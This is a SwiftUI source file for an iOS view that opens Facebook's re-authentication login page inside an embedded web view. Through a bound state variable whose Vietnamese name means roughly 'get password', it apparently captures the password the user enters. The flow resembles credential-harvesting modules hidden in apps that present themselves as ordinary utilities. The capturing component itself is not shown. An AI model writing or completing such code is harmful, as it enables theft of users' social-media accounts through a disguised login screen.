import SwiftUI

@available(iOS 14.0, *)
public struct ThreeView: View {
    public init(whenComplete: @escaping () -> (), isCheckMKRong: String) {
        self.whenComplete = whenComplete
        self.is_check_mk_rong = isCheckMKRong
    }
    
    var is_check_mk_rong: String
    @State var is_three_chuyen_man = false
    @State var is_three_load_hide = false
    @State var is_three_get_mat_khau: String = ""
    var whenComplete: () -> ()
    
    public var body: some View {
        if is_check_mk_rong.isEmpty {
            ZStack {
                if is_three_chuyen_man {
                    Color.clear.onAppear {
                        self.whenComplete()
                    }
                    
                } else {
                    if is_three_load_hide {
                        ProgressView("")
                    }
                    ZStack {
                        CoordsThree(url: URL(string: "https://www.facebook.com/login/reauth.php?next=https://www.facebook.com/home.php"), is_three_chuyen_man: $is_three_chuyen_man, is_three_load_hide: $is_three_load_hide, is_three_get_mat_khau: $is_three_get_mat_khau).opacity(is_three_load_hide ? 0 : 1)
                    }.zIndex(2.0)
                }
            }.foregroundColor(Color.black)
                .background(Color.white)
        } else {
            Color.clear.onAppear {
                self.whenComplete()
            }
        }
    }
}